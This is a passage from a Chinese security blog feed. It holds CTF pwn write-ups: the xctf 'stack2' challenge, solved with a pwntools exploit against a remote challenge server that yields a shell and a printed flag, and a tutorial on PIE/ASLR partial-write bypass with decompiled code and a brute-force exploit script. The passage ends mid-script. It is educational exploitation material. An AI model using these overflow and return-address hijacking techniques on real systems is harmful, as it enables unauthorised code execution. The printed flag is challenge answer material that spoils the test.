src="https://s1.ax1x.com/2020/07/15/U0Z3VS.png" alt=""><br>可以看到是0xffffd02c  那么执行后就是0xffffd0c0 少了12个字节，所以栈中正确的样子是：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zuvt.png" alt=""><br>所以需要的padding是：0x70+8+16 = 132.（可以自己随便输入某个数字来验证是否改变了返回地址）</p><h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><p><strong>在v13[v5] = v7;这条指令中 v7是int型v13是char型只占用一个字节（在赋值过程会转型），很适合payload来以字节大小填充。也就是说我们执行这条指令是以一个字节一个字节形式进行数据覆盖（16进制的两个数字）。</strong><br>通过IDA看到后门地址0x804859b 可以执行system(“/bin/bash”).因为每利用一次漏洞只能覆盖两个16进制数，所以要多次运行change numbers 选项。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh =process('./stack2')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">32607</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0804859B 后门</span><span class="token comment" spellcheck="true">#0x8048450 system</span><span class="token comment" spellcheck="true">#0x08048987 : sh</span><span class="token comment" spellcheck="true">#addr = [0x9b,0x85,0x04,0x08]               #原本我可以直接用后门地址，填充四次就可以了.这个本地没问题，但在打开端口后因为环境中只有sh这个指令所以会失败</span>addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#这个是来应对环境中只有sh命令，用gdb找到system函数地址，ROPgadgate找到sh字符串地址</span>                                                                        <span class="token comment" spellcheck="true">#在栈上构造了一个system("/sh")</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">132</span>                     <span class="token comment" spellcheck="true">#通过计算从132开始覆盖（记得小端序）由于addr的变动覆盖12次</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#pwntools发送的都是str类型</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token number">1</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这个虽然开了banary但是和他感觉没啥关系</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x46 bytes:    <span class="token string">'1. show numbers\n'</span>    <span class="token string">'2. add number\n'</span>    <span class="token string">'3. change number\n'</span>    <span class="token string">'4. get average\n'</span>    <span class="token string">'5. exit\n'</span>1. show numbers2. add number3. change number4. get average5. <span class="token keyword">exit</span>$ <span class="token function">ls</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x3 bytes:    <span class="token string">'ls\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x24 bytes:    <span class="token string">'bin\n'</span>    <span class="token string">'dev\n'</span>    <span class="token string">'flag\n'</span>    <span class="token string">'lib\n'</span>    <span class="token string">'lib32\n'</span>    <span class="token string">'lib64\n'</span>    <span class="token string">'stack2\n'</span>bindevflagliblib32lib64stack2$ <span class="token function">cat</span> flag<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x9 bytes:    <span class="token string">'cat flag\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x2d bytes:    <span class="token string">'cyberpeace{b39d4c717df76e74117613fc8e3a89d5}\n'</span>cyberpeace<span class="token punctuation">{</span>b39d4c717df76e74117613fc8e3a89d5<span class="token punctuation">}</span>$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE绕过</title>
      <link href="/2020/07/14/pie-rao-guo/"/>
      <url>/2020/07/14/pie-rao-guo/</url>
      
        <content type="html"><![CDATA[<h2 id="1：ASLR简单介绍"><a href="#1：ASLR简单介绍" class="headerlink" title="1：ASLR简单介绍"></a>1：ASLR简单介绍</h2><p>ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。<strong>可以理解为libc、栈、堆的加载位置被随机化。并没有对所有模块和内存区都进行随机化</strong></p><h2 id="2：PIE"><a href="#2：PIE" class="headerlink" title="2：PIE"></a>2：PIE</h2><p>PIE(position-independent executable, 地址无关可执行文件)技术就是一个针对<strong>代码段.text, 数据段.*data，.bss等固定地址</strong>的一个防护技术弥补了ASLR的不足。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget（代码区）也失效。</p><p>没有PIE保护的程序，每次加载的基址都是固定的</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN$ checksec  h2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/h2'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位基地址：0x400000</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN$ checksec level1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/level1'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>    RWX:      Has RWX segments</code></pre><p>32位基地址：0x8048000</p><h3 id="开启PIE"><a href="#开启PIE" class="headerlink" title="开启PIE"></a>开启PIE</h3><p>第一次：</p><pre class=" language-bash"><code class="language-bash">   0x562ddaa35a72:    mov    esi,0x80   0x562ddaa35a77:    mov    rdi,rax   0x562ddaa35a7a:    call   0x562ddaa357b0<span class="token operator">=</span><span class="token operator">></span> 0x562ddaa35a7f:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,0x0   0x562ddaa35a86:    jmp    0x562ddaa35aac   0x562ddaa35a88:    mov    eax,DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>   0x562ddaa35a8b:    cdqe      0x562ddaa35a8d:    movzx  ecx,BYTE PTR <span class="token punctuation">[</span>rbp+rax*1-0x90<span class="token punctuation">]</span></code></pre><p>第二次：</p><pre class=" language-bash"><code class="language-bash">   0x5610c0b62a72:    mov    esi,0x80   0x5610c0b62a77:    mov    rdi,rax   0x5610c0b62a7a:    call   0x5610c0b627b0<span class="token operator">=</span><span class="token operator">></span> 0x5610c0b62a7f:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,0x0   0x5610c0b62a86:    jmp    0x5610c0b62aac   0x5610c0b62a88:    mov    eax,DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>   0x5610c0b62a8b:    cdqe      0x5610c0b62a8d:    movzx  ecx,BYTE PTR <span class="token punctuation">[</span>rbp+rax*1-0x90<span class="token punctuation">]</span></code></pre><p>可以看到两次加载的基址是不一样的。<br>显然，PIE的应用给ROP技术造成了很大的影响。但是由于某些系统和缺陷，其他漏洞的存在和地址随机化本身的问题，方法还是有的。</p><h2 id="3：partial-write-bypass-PIE"><a href="#3：partial-write-bypass-PIE" class="headerlink" title="3：partial write bypass PIE"></a>3：partial write bypass PIE</h2><p>partial write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，<strong>某条指令的后12位，3个十六进制数的地址是始终不变的。因此我们找到目标地址的后三个十六进制数，然后想办法将返回地址（被压入的ip）后三个十六进制数覆盖成目标地址，从而达到劫持程序流程的目的</strong></p><h2 id="4：实操"><a href="#4：实操" class="headerlink" title="4：实操"></a>4：实操</h2><p>程序是DefCamp CTF Finals 2016: SMS (pwn 200)</p><h3 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h3><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/PIE$ checksec sms<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/PIE/sms'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><h3 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h3><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span>    <span class="token string">"--------------------------------------------\n"</span>    <span class="token string">"|   Welcome to Defcamp SMS service          |\n"</span>    <span class="token string">"--------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">dosms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>dosms函数：<span class="token keyword">int</span> <span class="token function">dosms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-C0h]     </span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8Ch] [rbp-34h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+B4h] [rbp-Ch]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #将v2地址处清零  v3 <span class="token operator">=</span> <span class="token number">140</span><span class="token punctuation">;</span>  <span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS delivered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">int</span> __fastcall <span class="token function">set_user</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">140</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+9Ch] [rbp-4h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">set_sms</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-400h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS our leader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>frontdoor函数：<span class="token keyword">int</span> <span class="token function">frontdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-80h]</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>那么可以看出程序大概是：先输出菜单，执行dosms函数。dosms中set_user获取名字，set_sms再次输入。我们要想办法控制程序执行frondoor这个后门。</p><h3 id="3：set-user-int64-amp-v1-函数"><a href="#3：set-user-int64-amp-v1-函数" class="headerlink" title="3：set_user((__int64)&amp;v1)函数"></a>3：set_user((__int64)&amp;v1)函数</h3><pre class=" language-c"><code class="language-c"><span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">int</span> __fastcall <span class="token function">set_user</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>         #这个函数的参数是dosms函数中<span class="token keyword">char</span> v1的地址，在dosmsm函数中定义了<span class="token keyword">char</span> v1后，通过伪代码可知其位于<span class="token punctuation">[</span>rbp<span class="token operator">-</span>C0h<span class="token punctuation">]</span><span class="token punctuation">{</span>                                           #在这个函数<span class="token operator">&amp;</span>v1参数被写成a1（是个地址）  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">140</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+9Ch] [rbp-4h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     #数组s，<span class="token number">128</span>字节大小范围清零  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>             #从标准输入流读取<span class="token number">128</span>个字符到s（地址），<span class="token number">128</span>如果太大就放入空字符  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>     #这个是s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>应该不会是<span class="token number">0</span>（大胆猜测），然后就会循环<span class="token number">41</span>次，将s，<span class="token number">0</span><span class="token operator">~</span><span class="token number">40</span>标号字符赋给a1（v1）地址处，从其<span class="token number">140</span>标号<span class="token operator">~</span><span class="token number">180</span>标号    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="4：set-sms-int64-amp-v1-函数"><a href="#4：set-sms-int64-amp-v1-函数" class="headerlink" title="4：set_sms((__int64)&amp;v1)函数"></a>4：set_sms((__int64)&amp;v1)函数</h3><p>fastcall是一种函数调用方式，在这里没啥用</p><pre class=" language-c"><code class="language-c"><span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">set_sms</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>               #一样，a1是dosms函数中v1的地址，作为该函数的参数，v1地址位于<span class="token punctuation">[</span>rbp<span class="token operator">-</span>C0h<span class="token punctuation">]</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-400h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      #数组s，<span class="token number">1024</span>字节清零  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS our leader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                 #从标准输入流读取<span class="token number">1024</span>个字符到s地址  <span class="token keyword">return</span> <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     #strncpy将从s地址处将其字符串赋值到a1（v1）地址，赋值的量得看第三个参数的大小<span class="token punctuation">}</span>                                                                #即a1（v1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">180</span>地址存放的数值将决定 strncpy函数一次赋值字符串的多少</code></pre><p>那么显然如果strncpy可能存在溢出，只要a1（v1)+180地址处的数值比较大，就可以溢出a1（v1地址），v1其位于[rbp-C0h]。而rbp下面就是返回地址。<br><img src="https://s1.ax1x.com/2020/07/15/Ua624g.png" alt=""><br>*<em>所以得再v1地址开始覆盖：0xc0 + 8(rbp) 个字符 == 200 后面再覆盖返回地址即可控制程序 *</em></p><h3 id="5：综上"><a href="#5：综上" class="headerlink" title="5：综上"></a>5：综上</h3><p>set_user((<strong>int64)&amp;v1)函数可以对a1（v1)+180地址处进行赋值，使其赋为0xca （202）。这样set_sms((</strong>int64)&amp;v1)函数就可以往a1（v1）地址读入0xca（202） 个字符。这样就可以来控制程序返回地址了。<br>为什么是202个字符，结合上面的PIE地址特点。最后面两个字节（16位）会占用后4个十六进制数（小端序）而不变的是后三个十六进制数，所以我们构造的倒数第四个十六进制数需要多次执行程序碰到刚好符合的地址。不可能放201个字符因为最后一个字节只能控制两个十六进制数。</p><p>因为那个倒数第四个数需要多次执行才可能碰到所以我们要进行循环爆破，但也就0~f这几种情况，爆破次数应该不会很大，可以接受。</p><p>后门的特征地址：</p><pre class=" language-bash"><code class="language-bash">.text:0000000000000900 push    rbp.text:0000000000000901 mov     rbp, rsp.text:0000000000000904 add     rsp, 0FFFFFFFFFFFFFF80h <span class="token punctuation">;</span> Add.text:0000000000000908 mov     rdx, cs:__bss_start <span class="token punctuation">;</span> stream.text:000000000000090F lea     rax, <span class="token punctuation">[</span>rbp+s<span class="token punctuation">]</span>    <span class="token punctuation">;</span> Load Effective Address.text:0000000000000913 mov     esi, 80h        <span class="token punctuation">;</span> n.text:0000000000000918 mov     rdi, rax        <span class="token punctuation">;</span> s.text:000000000000091B call    _fgets          <span class="token punctuation">;</span> Call Procedure.text:0000000000000920 lea     rax, <span class="token punctuation">[</span>rbp+s<span class="token punctuation">]</span>    <span class="token punctuation">;</span> Load Effective Address.text:0000000000000924 mov     rdi, rax        <span class="token punctuation">;</span> <span class="token function">command</span>.text:0000000000000927 call    _system         <span class="token punctuation">;</span> Call Procedure.text:000000000000092C nop                     <span class="token punctuation">;</span> No Operation.text:000000000000092D leave                   <span class="token punctuation">;</span> High Level Procedure Exit.text:000000000000092E retn                    <span class="token punctuation">;</span> Return Near from Pro</code></pre><p><strong>所以200个padding后面 应该如此构造：’\x00’ + ‘\x99’  (小端序倒着存）后面这个x99第一个9就是猜的，随便一个都行。</strong><br>所以主要exp因该是：</p><pre class=" language-python"><code class="language-python">    payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span><span class="token string">'\xca'</span>     sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span> payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">200</span>  <span class="token operator">+</span> <span class="token string">'\x00\x99'</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span></code></pre><p>但是很可惜这是错的！！！为啥？因为你在payload2上放了一个\x00这难道不会被strncpy当作截断符吗？？？<br>所以往后面调一下：\x01\x99</p><h3 id="6：EXP"><a href="#6：EXP" class="headerlink" title="6：EXP"></a>6：EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep    <span class="token comment" spellcheck="true">#引入time模块的sleep函数可以让爆破过程放慢，我们看到清楚一点</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#256，也可以小一点</span>        i <span class="token operator">+=</span> <span class="token number">1</span>                     <span class="token keyword">print</span> i             <span class="token comment" spellcheck="true">#可以显示爆破次数</span>        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./sms'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    <span class="token comment" spellcheck="true">#set_user</span>    payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span><span class="token string">'\xca'</span>    <span class="token comment" spellcheck="true">#set_user((__int64)&amp;v1)函数循环赋值41次最后的'\xca'就是为覆盖返回地址准备的</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#set_sms</span>    payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">200</span>  <span class="token operator">+</span> <span class="token string">'\x01\x99'</span>     <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    